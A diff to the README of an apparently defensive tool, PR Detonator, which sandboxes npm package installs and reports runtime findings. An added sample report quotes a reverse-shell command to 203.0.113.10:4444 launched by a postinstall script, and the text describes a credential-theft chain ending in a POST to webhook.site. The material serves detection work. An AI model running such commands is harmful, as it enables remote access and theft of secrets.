@@ -4,7 +4,8 @@
 did against what the pull request claimed.**
 
 > **We pointed it at 100 packages published to npm minutes earlier, knowing nothing about any
-> of them. It cleared 73 of 73 that installed, and flagged one.**
+> of them. 73 installed and all 73 came back clean. Of the 27 that did not install, one was
+> blocked anyway — on evidence captured before it timed out.**
 >
 > That one connected to a hardcoded IP address on a non-standard port during `postinstall`,
 > with no DNS lookup at all. Reading its published source explained why: a fallback path
@@ -63,6 +64,19 @@ spawns a reverse shell. PR Detonator's comment:
 > | 🟠 high | `NET_RAW_IP` | bash connected to 203.0.113.10:4444 with no DNS lookup |
 >
 > **Process tree:** `npm install → sh -c "node scripts/telemetry-optout.js" → node → bash -c "bash -i >& /dev/tcp/…"`
+>
+> ### What happened, in order
+> - `+0.00s` ▶ **npm** install started
+> - `+0.44s` 📜 **npm** ran the install script `node scripts/telemetry-optout.js`
+> - `+0.48s` ⚙ **bash** ran `-c "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"`
+> - `+0.48s` 🌐 **bash** connected to `203.0.113.10:4444`
+
+That last section is the one a reviewer reads first. Four findings are a list; the same four
+facts in the kernel's own recorded order are an attack. For the Shai-Hulud reconstruction it
+reads: ran the install script → opened `~/.npmrc` → fetched a GitHub release → unpacked it →
+ran **trufflehog** over the workspace → `POST`ed to `webhook.site`, 3.9 s in. The ordering is
+the kernel's nanosecond timestamps, not a reconstruction, and the section is **report-only** —
+built after the verdict, so it can never change one.
 
 ## Architecture
 
